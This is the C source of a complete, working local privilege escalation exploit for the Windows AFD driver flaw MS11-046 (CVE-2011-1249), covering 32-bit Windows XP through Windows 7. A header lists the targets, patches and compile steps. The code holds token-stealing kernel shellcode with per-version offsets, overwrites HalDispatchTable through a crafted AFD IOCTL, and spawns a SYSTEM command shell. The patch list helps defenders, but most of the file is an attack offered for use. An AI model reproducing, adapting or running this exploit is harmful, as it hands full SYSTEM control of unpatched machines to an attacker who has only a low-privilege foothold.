/*
################################################################
# Exploit Title: Windows x86 (all versions) AFD privilege escalation (MS11-046)
# Date: 2016-10-16
# Exploit Author: Tomislav Paskalev
# Vulnerable Software:
#   Windows XP SP3 x86
#   Windows XP Pro SP2 x64
#   Windows Server 2003 SP2 x86
#   Windows Server 2003 SP2 x64
#   Windows Server 2003 SP2 Itanium-based Systems 
#   Windows Vista SP1 x86
#   Windows Vista SP2 x86
#   Windows Vista SP1 x64
#   Windows Vista SP2 x64
#   Windows Server 2008 x86
#   Windows Server 2008 SP2 x86
#   Windows Server 2008 x64
#   Windows Server 2008 SP2 x64
#   Windows Server 2008 Itanium-based Systems
#   Windows Server 2008 SP2 Itanium-based Systems
#   Windows 7 x86
#   Windows 7 SP1 x86
#   Windows 7 x64
#   Windows 7 SP1 x64
#   Windows Server 2008 R2 x64
#   Windows Server 2008 R2 SP1 x64
#   Windows Server 2008 R2 Itanium-based Systems
#   Windows Server 2008 R2 SP1 Itanium-based Systems
# Supported Vulnerable Software:
#   Windows XP SP3 x86
#   Windows Server 2003 SP2 x86
#   Windows Vista SP1 x86
#   Windows Vista SP2 x86
#   Windows Server 2008 x86
#   Windows Server 2008 SP2 x86
#   Windows 7 x86
#   Windows 7 SP1 x86
# Tested Software:
#   Windows XP Pro SP3 x86 EN          [5.1.2600]
#   Windows Server 2003 Ent SP2 EN     [5.2.3790]
#   Windows Vista Ult SP1 x86 EN       [6.0.6001]
#   Windows Vista Ult SP2 x86 EN       [6.0.6002]
#   Windows Server 2008 Dat SP1 x86 EN [6.0.6001]
#   Windows Server 2008 Ent SP2 x86 EN [6.0.6002]
#   Windows 7 HB x86 EN                [6.1.7600]
#   Windows 7 Ent SP1 x86 EN           [6.1.7601]
# CVE ID: 2011-1249
################################################################
# Vulnerability description:
#   The Ancillary Function Driver (AFD) supports Windows sockets 
#   applications and is contained in the afd.sys file. The afd.sys
#   driver runs in kernel mode and manages the Winsock TCP/IP
#   communications protocol. 
#   An elevation of privilege vulnerability exists where the AFD
#   improperly validates input passed from user mode to the kernel.
#   An attacker must have valid logon credentials and be able to
#   log on locally to exploit the vulnerability.
#   An attacker who successfully exploited this vulnerability could
#   run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM
#   privileges).
################################################################
# Exploit notes:
#   Privileged shell execution:
#     - the SYSTEM shell will spawn within the invoking shell/process
#   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
#     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
#   Exploit prerequisites:
#     - low privilege access to the target OS
#     - target OS not patched (KB2503665, or any other related
#       patch, if applicable, not installed - check "Related security
#       vulnerabilities/patches")
#   Exploit test notes:
#     - let the target OS boot properly (if applicable)
#     - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset
################################################################
# Patches:
#   Windows XP SP3 x86
#     WindowsXP-KB2503665-x86-enu.exe
#       (not available - EoL)
#   Windows Server 2003 SP2 x86
#     WindowsServer2003-KB2503665-x86-enu.exe
#       https://www.microsoft.com/en-us/download/details.aspx?id=26483
#   Windows Vista SP1, SP2 x86; Windows Server 2008 (SP1), SP2 x86
#     Windows6.0-KB2503665-x86.msu
#       https://www.microsoft.com/en-us/download/details.aspx?id=26275
#   Windows 7 (SP0), SP1 x86
#     Windows6.1-KB2503665-x86.msu
#       https://www.microsoft.com/en-us/download/details.aspx?id=26311
################################################################
# Related security vulnerabilities/patches:
#   MS11-046  KB2503665  https://technet.microsoft.com/en-us/library/security/ms11-046.aspx
#   MS11-080  KB2592799  https://technet.microsoft.com/en-us/library/security/ms11-080.aspx
#   MS12-009  KB2645640  https://technet.microsoft.com/en-us/library/security/ms12-009.aspx
#   MS13-093  KB2875783  https://technet.microsoft.com/en-us/library/security/ms13-093.aspx
#   MS14-040  KB2975684  https://technet.microsoft.com/en-us/library/security/ms14-040.aspx
#
#   Table of patch replacements:
#                               | MS11-046  | MS11-080  | MS12-009  | MS13-093  | MS14-040  |
#                               -------------------------------------------------------------
#                               | KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 |
#   -----------------------------------------------------------------------------------------
#   Windows x86 XP SP3          | Installed | <-Replaces|     -     |     -     |     -     |
#   Windows x86 Server 2003 SP2 | Installed | <-Replaces| <-Replaces|     -     | <-Replaces|
#   Windows x86 Vista SP1       | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 Vista SP2       | Installed |     -     |     -     |     -     | <-Replaces|
#   Windows x86 Server 2008     | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 Server 2008 SP2 | Installed |     -     |     -     |     -     | <-Replaces|
#   Windows x86 7               | Installed |     -     |     -     |     -     |     -     |
#   Windows x86 7 SP1           | Installed |     -     |     -     |     -     | <-Replaces|
################################################################
# Thanks to:
#   azy (XP, 2k3 exploit)
#   Rahul Sasi (PoC)
################################################################
# References:
#   https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-1249
#   https://technet.microsoft.com/en-us/library/security/ms11-046.aspx
#   http://web.qhwins.com/Security/2012021712023641874126.html
#   https://www.exploit-db.com/exploits/18755/
################################################################
*/


#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>

#pragma comment (lib, "ws2_32.lib")


////////////////////////////////////////////////////////////////
// DEFINE DATA TYPES
////////////////////////////////////////////////////////////////

typedef enum _KPROFILE_SOURCE {
    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;


typedef DWORD (WINAPI *PNTQUERYINTERVAL) (
    KPROFILE_SOURCE   ProfileSource,
    PULONG            Interval
);


typedef LONG NTSTATUS;


typedef NTSTATUS (WINAPI *PNTALLOCATE) (
    HANDLE            ProcessHandle,
    PVOID             *BaseAddress,
    ULONG             ZeroBits,
    PULONG            RegionSize,
    ULONG             AllocationType,
    ULONG             Protect
);


typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS      Status;
        PVOID         Pointer;
    };
    ULONG_PTR         Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;


typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG             Reserved[2];
    PVOID             Base;
    ULONG             Size;
    ULONG             Flags;
    USHORT            Index;
    USHORT            Unknown;
    USHORT            LoadCount;
    USHORT            ModuleNameOffset;
    CHAR              ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);


////////////////////////////////////////////////////////////////
// FUNCTIONS
////////////////////////////////////////////////////////////////

BOOL IsWow64()
{
    BOOL bIsWow64 = FALSE;
    LPFN_ISWOW64PROCESS fnIsWow64Process;

    fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if(NULL != fnIsWow64Process)
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms684139(v=vs.85).aspx
        if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
        {
            // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
            printf("   [-] Failed (error code: %d)\n", GetLastError());
            return -1;
        }
    }
    return bIsWow64;
}


////////////////////////////////////////////////////////////////
// MAIN FUNCTION
////////////////////////////////////////////////////////////////

int main(void)
{
    printf("[*] MS11-046 (CVE-2011-1249) x86 exploit\n");
    printf("   [*] by Tomislav Paskalev\n");


    ////////////////////////////////////////////////////////////////
    // IDENTIFY TARGET OS ARCHITECTURE AND VERSION
    ////////////////////////////////////////////////////////////////

    printf("[*] Identifying OS\n");


    // identify target machine's OS architecture
    // in case the target machine is running a 64-bit OS
    if(IsWow64())
    {
        printf("   [-] 64-bit\n");
        return -1;
    }

    printf("   [+] 32-bit\n");


    // identify target machine's OS version
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724451(v=vs.85).aspx
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724832(v=vs.85).aspx
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724833(v=vs.85).aspx
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO) &osvi);

    // define operating system version specific variables
    unsigned char shellcode_KPROCESS;
    unsigned char shellcode_TOKEN;
    unsigned char shellcode_UPID;
    unsigned char shellcode_APLINKS;
    const char **securityPatchesPtr;
    int securityPatchesCount;
    int lpInBufferSize;

    ////////////////////////////////////////////////////////////////
    /*
    OS VERSION SPECIFIC OFFSETS

    references:
      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/original.htm
      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/late52.htm
      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/current.htm
      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/


    - nt!_KTHREAD.ApcState.Process (+0x10)
    0x30 (3.51);
    0x34 (>3.51 to 5.1);
    0x28 (late 5.2);
    0x38 (6.0);
    0x40 (6.1);
    0x70 (6.2 and higher)

    - nt!_EPROCESS.Token
    0x0108 (3.51 to 4.0);
    0x012C (5.0);
    0xC8 (5.1 to early 5.2);
    0xD8 (late 5.2);
    0xE0 (6.0);
    0xF8 (6.1);
    0xEC (6.2 to 6.3);
    0xF4

    - nt!_EPROCESS.UniqueProcessId
    0x94 (3.51 to 4.0);
    0x9C (5.0);
    0x84 (5.1 to early 5.2);
    0x94 (late 5.2);
    0x9C (6.0);
    0xB4

    - nt!_EPROCESS.ActiveProcessLinks.Flink
    0x98 (3.51 to 4.0);
    0xA0 (5.0);
    0x88 (5.1 to early 5.2);
    0x98 (late 5.2);
    0xA0 (6.0);
    0xB8

    */
    ////////////////////////////////////////////////////////////////

    // in case the OS version is 5.1, service pack 3
    if((osvi.dwMajorVersion == 5) && (osvi.dwMinorVersion == 1) && (osvi.wServicePackMajor == 3))
    {
        // the target machine's OS is Windows XP SP3
        printf("   [+] Windows XP SP3\n");
        shellcode_KPROCESS = '\x44';
        shellcode_TOKEN    = '\xC8';
        shellcode_UPID     = '\x84';
        shellcode_APLINKS  = '\x88';
        const char *securityPatches[] = {"KB2503665", "KB2592799"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 2;
        lpInBufferSize = 0x30;
    }

    // in case the OS version is 5.2, service pack 2, not R2
    //   https://msdn.microsoft.com/en-us/library/windows/desktop/ms724385(v=vs.85).aspx
    else if((osvi.dwMajorVersion == 5) && (osvi.dwMinorVersion == 2) && (osvi.wServicePackMajor == 2) && (GetSystemMetrics(89) == 0))
    {
        // the target machine's OS is Windows Server 2003 SP2
        printf("   [+] Windows Server 2003 SP2\n");
        shellcode_KPROCESS = '\x38';
        shellcode_TOKEN    = '\xD8';
        shellcode_UPID     = '\x94';
        shellcode_APLINKS  = '\x98';
        const char *securityPatches[] = {"KB2503665", "KB2592799", "KB2645640", "KB2975684"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 4;
        lpInBufferSize = 0x30;
    }

    // in case the OS version is 6.0, service pack 1, workstation
    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 0) && (osvi.wServicePackMajor == 1) && (osvi.wProductType == 1))
    {
        // the target machine's OS is Windows Vista SP1
        printf("   [+] Windows Vista SP1\n");
        shellcode_KPROCESS = '\x48';
        shellcode_TOKEN    = '\xE0';
        shellcode_UPID     = '\x9C';
        shellcode_APLINKS  = '\xA0';
        const char *securityPatches[] = {"KB2503665"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 1;
        lpInBufferSize = 0x30;
    }

    // in case the OS version is 6.0, service pack 2, workstation
    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 0) && (osvi.wServicePackMajor == 2) && (osvi.wProductType == 1))
    {
        // the target machine's OS is Windows Vista SP2
        printf("   [+] Windows Vista SP2\n");
        shellcode_KPROCESS = '\x48';
        shellcode_TOKEN    = '\xE0';
        shellcode_UPID     = '\x9C';
        shellcode_APLINKS  = '\xA0';
        const char *securityPatches[] = {"KB2503665", "KB2975684"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 2;
        lpInBufferSize = 0x10;
    }

    // in case the OS version is 6.0, no service pack*, server
    // *Because Windows Server 2008 is based on the Windows NT 6.0 Service Pack 1 kernel, the RTM release is considered to be Service Pack 1;
    // accordingly, the first service pack is called Service Pack 2.
    //   https://en.wikipedia.org/wiki/Windows_Server_2008
    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 0) && (osvi.wServicePackMajor == 1) && (osvi.wProductType != 1))
    {
        // the target machine's OS is Windows Server 2008
        printf("   [+] Windows Server 2008\n");
        shellcode_KPROCESS = '\x48';
        shellcode_TOKEN    = '\xE0';
        shellcode_UPID     = '\x9C';
        shellcode_APLINKS  = '\xA0';
        const char *securityPatches[] = {"KB2503665"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 1;
        lpInBufferSize = 0x10;
    }

    // in case the OS version is 6.0, service pack 2, server
    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 0) && (osvi.wServicePackMajor == 2) && (osvi.wProductType != 1))
    {
        // the target machine's OS is Windows Server 2008 SP2
        printf("   [+] Windows Server 2008 SP2\n");
        shellcode_KPROCESS = '\x48';
        shellcode_TOKEN    = '\xE0';
        shellcode_UPID     = '\x9C';
        shellcode_APLINKS  = '\xA0';
        const char *securityPatches[] = {"KB2503665", "KB2975684"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 2;
        lpInBufferSize = 0x08;
    }

    // in case the OS version is 6.1, no service pack (note: Windows Server 2008 R2 is 64-bit only)
    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 1) && (osvi.wServicePackMajor == 0))
    {
        // the target machine's OS is Windows 7
        printf("   [+] Windows 7\n");
        shellcode_KPROCESS = '\x50';
        shellcode_TOKEN    = '\xF8';
        shellcode_UPID     = '\xB4';
        shellcode_APLINKS  = '\xB8';
        const char *securityPatches[] = {"KB2503665"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 1;
        lpInBufferSize = 0x20;
    }

    // in case the OS version is 6.1, service pack 1 (note: Windows Server 2008 R2 is 64-bit only)
    else if((osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 1) && (osvi.wServicePackMajor == 1))
    {
        // the target machine's OS is Windows 7 SP1
        printf("   [+] Windows 7 SP1\n");
        shellcode_KPROCESS = '\x50';
        shellcode_TOKEN    = '\xF8';
        shellcode_UPID     = '\xB4';
        shellcode_APLINKS  = '\xB8';
        const char *securityPatches[] = {"KB2503665", "KB2975684"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 2;
        lpInBufferSize = 0x10;
    }

    // in case the OS version is not any of the previously checked versions
    else
    {
        // the target machine's OS is an unsupported 32-bit Windows version
        printf("   [-] Unsupported version\n");
        printf("      [*] Affected 32-bit operating systems\n");
        printf("         [*] Windows XP SP3\n");
        printf("         [*] Windows Server 2003 SP2\n");
        printf("         [*] Windows Vista SP1\n");
        printf("         [*] Windows Vista SP2\n");
        printf("         [*] Windows Server 2008\n");
        printf("         [*] Windows Server 2008 SP2\n");
        printf("         [*] Windows 7\n");
        printf("         [*] Windows 7 SP1\n");
        return -1;
    }


    ////////////////////////////////////////////////////////////////
    // LOCATE REQUIRED OS COMPONENTS
    ////////////////////////////////////////////////////////////////

    printf("[*] Locating required OS components\n");


    // retrieve system information
    //   https://msdn.microsoft.com/en-us/library/windows/desktop/ms725506(v=vs.85).aspx
    // locate "ZwQuerySystemInformation" in the "ntdll.dll" module
    //   https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212(v=vs.85).aspx
    FARPROC ZwQuerySystemInformation;
    ZwQuerySystemInformation = GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwQuerySystemInformation");

    // 11 = SystemModuleInformation
    //   http://winformx.florian-rappl.de/html/e6d5d5c1-8d83-199b-004f-8767439c70eb.htm
    ULONG systemInformation;
    ZwQuerySystemInformation(11, (PVOID) &systemInformation, 0, &systemInformation);

    // allocate memory for the list of loaded modules
    ULONG *systemInformationBuffer;
    systemInformationBuffer = (ULONG *) malloc(systemInformation * sizeof(*systemInformationBuffer));

    if(!systemInformationBuffer)
    {
        printf("   [-] Could not allocate memory");
        return -1;
    }


    // retrieve the list of loaded modules 
    ZwQuerySystemInformation(11, systemInformationBuffer, systemInformation * sizeof(*systemInformationBuffer), NULL);

    // locate "ntkrnlpa.exe" or "ntoskrnl.exe" in the retrieved list of loaded modules
    ULONG i;
    PVOID targetKrnlMdlBaseAddr;
    HMODULE targetKrnlMdlUsrSpcOffs;
    BOOL foundModule = FALSE;
    PSYSTEM_MODULE_INFORMATION loadedMdlStructPtr;
    loadedMdlStructPtr = (PSYSTEM_MODULE_INFORMATION) (systemInformationBuffer + 1);

    for(i = 0; i < *systemInformationBuffer; i++)
    {
        if(strstr(loadedMdlStructPtr[i].ImageName, "ntkrnlpa.exe"))
        {
            printf("   [+] ntkrnlpa.exe\n");
            targetKrnlMdlUsrSpcOffs = LoadLibraryExA("ntkrnlpa.exe", 0, 1);
            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;
            foundModule = TRUE;
            break;
        }    
        else if(strstr(loadedMdlStructPtr[i].ImageName, "ntoskrnl.exe"))
        {
            printf("   [+] ntoskrnl.exe\n");
            targetKrnlMdlUsrSpcOffs = LoadLibraryExA("ntoskrnl.exe", 0, 1);
            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;
            foundModule = TRUE;
            break;
        }     
    }

    // base address of the loaded module (kernel space)
    printf("      [*] Address:      %#010x\n", targetKrnlMdlBaseAddr);

    // offset address (relative to the parent process) of the loaded module (user space)
    printf("      [*] Offset:       %#010x\n", targetKrnlMdlUsrSpcOffs);

    if(!foundModule)
    {
        printf("   [-] Could not find ntkrnlpa.exe/ntoskrnl.exe\n");
        return -1;
    }

    // free allocated buffer space
    free(systemInformationBuffer);


    // determine the address of the "HalDispatchTable" process (kernel space)
    // locate the offset fo the "HalDispatchTable" process within the target module (user space)
    ULONG_PTR HalDispatchTableUsrSpcOffs;
    HalDispatchTableUsrSpcOffs = (ULONG_PTR) GetProcAddress(targetKrnlMdlUsrSpcOffs, "HalDispatchTable");

    if(!HalDispatchTableUsrSpcOffs)
    {
        printf("      [-] Could not find HalDispatchTable\n");
        return -1;
    }

    printf("      [+] HalDispatchTable\n");
    printf("         [*] Offset:    %#010x\n", HalDispatchTableUsrSpcOffs);

    // calculate the address of "HalDispatchTable" in kernel space
    // 1. identify the base address of the target module in kernel space
    // 2. previous step's result [minus] the load address of the same module in user space
    // 3. previous step's result [plus] the address of "HalDispatchTable" in user space
    // EQUIVALENT TO:
    // 1. determine RVA of HalDispatchTable
    // *Relative Virtual Address - the address of an item after it is loaded into memory, with the base address of the image file subtracted from it.
    // 2. previous step's result [plus] base address of target module in kernel space
    ULONG_PTR HalDispatchTableKrnlSpcAddr;
    HalDispatchTableKrnlSpcAddr = HalDispatchTableUsrSpcOffs - (ULONG_PTR) targetKrnlMdlUsrSpcOffs;
    HalDispatchTableKrnlSpcAddr += (ULONG_PTR) targetKrnlMdlBaseAddr;


    // locate "NtQueryIntervalProfile" in the "ntdll.dll" module
    PNTQUERYINTERVAL NtQueryIntervalProfile;
    NtQueryIntervalProfile = (PNTQUERYINTERVAL) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");

    if(!NtQueryIntervalProfile)
    {
        printf("   [-] Could not find NtQueryIntervalProfile\n");
        return -1;
    }

    printf("   [+] NtQueryIntervalProfile\n");
    printf("      [*] Address:      %#010x\n", NtQueryIntervalProfile);


    // locate "ZwDeviceIoControlFile" routine in the "ntdll.dll" module
    //   https://msdn.microsoft.com/en-us/library/windows/hardware/ff566441(v=vs.85).aspx
    FARPROC ZwDeviceIoControlFile;
    ZwDeviceIoControlFile = GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwDeviceIoControlFile");

    if(!ZwDeviceIoControlFile)
    {
        printf("   [-] Could not find ZwDeviceIoControlFile\n");
        return -1;
    }

    printf("   [+] ZwDeviceIoControlFile\n");
    printf("      [*] Address:      %#010x\n", ZwDeviceIoControlFile);


    ////////////////////////////////////////////////////////////////
    // SETUP EXPLOITATION PREREQUISITE
    ////////////////////////////////////////////////////////////////

    printf("[*] Setting up exploitation prerequisite\n");


    // initialize Winsock DLL
    printf ("   [*] Initialising Winsock DLL\n");
    WORD wVersionRequested;
    WSADATA wsaData;
    int wsaStartupErrorCode;

    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms632663(v=vs.85).aspx
    wVersionRequested = MAKEWORD(2, 2);

    // initiate the use of the Winsock DLL
    //   https://msdn.microsoft.com/en-us/library/windows/desktop/ms742213(v=vs.85).aspx
    wsaStartupErrorCode = WSAStartup(wVersionRequested, &wsaData);

    if(wsaStartupErrorCode != 0)
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
        printf("      [-] Failed (error code: %d)\n", wsaStartupErrorCode);
        return -1;
    }

    printf("      [+] Done\n");


    // create socket
    printf("      [*] Creating socket\n");
    SOCKET targetDeviceSocket = INVALID_SOCKET;

    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx
    targetDeviceSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    if(targetDeviceSocket == INVALID_SOCKET)
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
        printf("         [-] Failed (error code: %ld)\n", WSAGetLastError());
        return -1;
    }

    printf("         [+] Done\n");


    // connect to a closed port
    // connect to port 0 on the local machine
    struct sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("127.0.0.1");
    clientService.sin_port = htons(0);

    printf("         [*] Connecting to closed port\n");
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms737625(v=vs.85).aspx
    int connectResult;
    connectResult = connect(targetDeviceSocket, (SOCKADDR *) &clientService, sizeof(clientService));
    if (connectResult == 0)
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
        printf ("            [-] Connected (error code: %ld)\n", WSAGetLastError());
        return -1;
    }

    printf("            [+] Done\n");


    ////////////////////////////////////////////////////////////////
    // CREATE TOKEN STEALING SHELLCODE
    ////////////////////////////////////////////////////////////////

    printf("[*] Creating token stealing shellcode\n");


    // construct the token stealing shellcode
    unsigned char shellcode[] =
    {
        0x52,                                                        // PUSH EDX                     Save EDX on the stack (save context)
        0x53,	                                                     // PUSH EBX                     Save EBX on the stack (save context)
        0x33,0xC0,                                                   // XOR EAX, EAX                 Zero out EAX (EAX = 0)
        0x64,0x8B,0x80,0x24,0x01,0x00,0x00,                          // MOV EAX, FS:[EAX+0x124]      Retrieve current _KTHREAD structure
        0x8B,0x40,shellcode_KPROCESS,                                // MOV EAX, [EAX+_KPROCESS]     Retrieve _EPROCESS structure
        0x8B,0xC8,                                                   // MOV ECX, EAX                 Copy EAX (_EPROCESS) to ECX
        0x8B,0x98,shellcode_TOKEN,0x00,0x00,0x00,                    // MOV EBX, [EAX+_TOKEN]        Retrieve current _TOKEN
        0x8B,0x80,shellcode_APLINKS,0x00,0x00,0x00,                  // MOV EAX, [EAX+_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
        0x81,0xE8,shellcode_APLINKS,0x00,0x00,0x00,                  // SUB EAX, _APLINKS         |  Retrieve EPROCESS from ActiveProcessLinks
        0x81,0xB8,shellcode_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00, // CMP [EAX+_UPID], 0x4      |  Compare UniqueProcessId with 4 (System Process)
        0x75,0xE8,                                                   // JNZ/JNE                ----  Jump if not zero/not equal
        0x8B,0x90,shellcode_TOKEN,0x00,0x00,0x00,                    // MOV EDX, [EAX+_TOKEN]        Copy SYSTEM _TOKEN to EDX
        0x8B,0xC1,                                                   // MOV EAX, ECX                 Copy ECX (current process _TOKEN) to EAX
        0x89,0x90,shellcode_TOKEN,0x00,0x00,0x00,                    // MOV [EAX+_TOKEN], EDX        Copy SYSTEM _TOKEN to current process _TOKEN
        0x5B,                                                        // POP EBX                      Pop current stack value to EBX (restore context)
        0x5A,                                                        // POP EDX                      Pop current stack value to EDX (restore context)
        0xC2,0x08                                                    // RET 8                        Return
    };

    printf("   [*] Shellcode assembled\n");


    // allocate memory (RWE permissions) for the shellcode
    printf("   [*] Allocating memory\n");
    LPVOID shellcodeAddress;
    shellcodeAddress = VirtualAlloc((PVOID) 0x02070000, 0x20000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    int errorCode = 0;

    if(shellcodeAddress == NULL)
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
        errorCode = GetLastError();
        // in case of ERROR_INVALID_ADDRESS
        if(errorCode == 487)
        {
            // Attempt to access invalid address
            // occurs since a fixed address is being reserved
            //   http://stackoverflow.com/questions/21368429/error-code-487-error-invalid-address-when-using-virtualallocex
            printf("      [!] Could not reserve entire range\n");
            printf("         [*] Rerun exploit\n");
        }
        // in case of any other error
        else
            printf("      [-] Failed (error code: %d)\n", errorCode);
        return -1;
    }

    printf("      [+] Address:      %#010x\n", shellcodeAddress);


    // copy the shellcode to the allocated memory
    memset(shellcodeAddress, 0x90, 0x20000);
    memcpy((shellcodeAddress + 0x10000), shellcode, sizeof(shellcode));
    printf("      [*] Shellcode copied\n");


    ////////////////////////////////////////////////////////////////
    // EXPLOIT THE VULNERABILITY
    ////////////////////////////////////////////////////////////////

    printf("[*] Exploiting vulnerability\n");


    // send AFD socket connect request
    printf("   [*] Sending AFD socket connect request\n");
    DWORD lpInBuffer[lpInBufferSize];
    memset(lpInBuffer, 0, (lpInBufferSize * sizeof(DWORD)));

    lpInBuffer[3] = 0x01;
    lpInBuffer[4] = 0x20;
    ULONG lpBytesReturned = 0;

    if(DeviceIoControl(
        (HANDLE) targetDeviceSocket,
        0x00012007,                                                        // IOCTL_AFD_CONNECT
        (PVOID) lpInBuffer, sizeof(lpInBuffer),
        (PVOID) (HalDispatchTableKrnlSpcAddr + 0x6), 0x0,
        &lpBytesReturned, NULL
        ) == 0)
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms679360(v=vs.85).aspx
        errorCode = GetLastError();
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
        // in case of ERROR_INVALID_NETNAME
        if(errorCode == 1214)
        {
            // AFD socket connect request successful
            printf("      [+] Done\n");
        }
        // in case of ERROR_NOACCESS
        else if(errorCode == 998)
        {
            // AFD socket connect request unsuccessful - target is patched
            printf("      [!] Target patched\n");
            printf("         [*] Possible security patches\n");
            for(i = 0; i < securityPatchesCount; i++)
                printf("            [*] %s\n", securityPatchesPtr[i]);
            return -1;
        }
        // in case of any other error message
        else
        {
            // print the error code
            printf("      [-] Failed (error code: %d)\n", errorCode);
            return -1;
        }
    }


    // elevate privileges of the current process
    printf("      [*] Elevating privileges to SYSTEM\n");
    ULONG outInterval = 0;
    // https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProfile%2FNtQueryIntervalProfile.html
    NtQueryIntervalProfile(2, &outInterval);
    printf("         [+] Done\n");


    // spawn shell (with elevated privileges)
    printf("         [*] Spawning shell\n");
    // spawn SYSTEM shell within the current shell (remote shell friendly)
    system ("c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32");

    // clean up and exit
    printf("\n[*] Exiting SYSTEM shell\n");
    WSACleanup();
    return 1;
}

// EoF
